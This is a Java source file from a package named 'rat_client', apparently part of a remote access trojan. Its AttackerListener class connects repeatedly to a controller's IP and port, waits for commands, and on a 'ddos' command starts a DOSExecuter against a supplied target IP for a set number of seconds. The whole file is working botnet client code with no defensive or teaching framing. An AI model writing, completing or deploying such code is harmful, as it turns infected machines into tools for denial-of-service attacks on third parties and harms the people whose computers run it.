package rat_client;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.net.Socket;

public class AttackerListener implements Runnable
{
    private Socket socket;
    private String ip_address;
    private int port;

    public AttackerListener(String ip_address,int port)
    {
        this.ip_address=ip_address;
        this.port=port;
        Thread thread=new Thread(this);
        thread.start();
    }

    
    
    private void listenForCommands()
    {
        try
        {
            while(true)
            {
                ObjectInputStream ois=new ObjectInputStream(socket.getInputStream());
                String command=ois.readUTF();
                if(command.equals("ddos"))
                {
                     String selected_ip_address=ois.readUTF();
                     int secondsToRun=ois.readInt();
                     new DOSExecuter(selected_ip_address,secondsToRun);
                }
            }
        }
        catch(IOException exc)
        {
                Thread thread=new Thread(this);
                thread.start();
        }
    }
    
    @Override
    public void run() {
       while(true)
           try
           {
               socket=new Socket(ip_address,port);
               listenForCommands();
               return;
           }
           catch(IOException exc)
           {
               
           }
    }
}
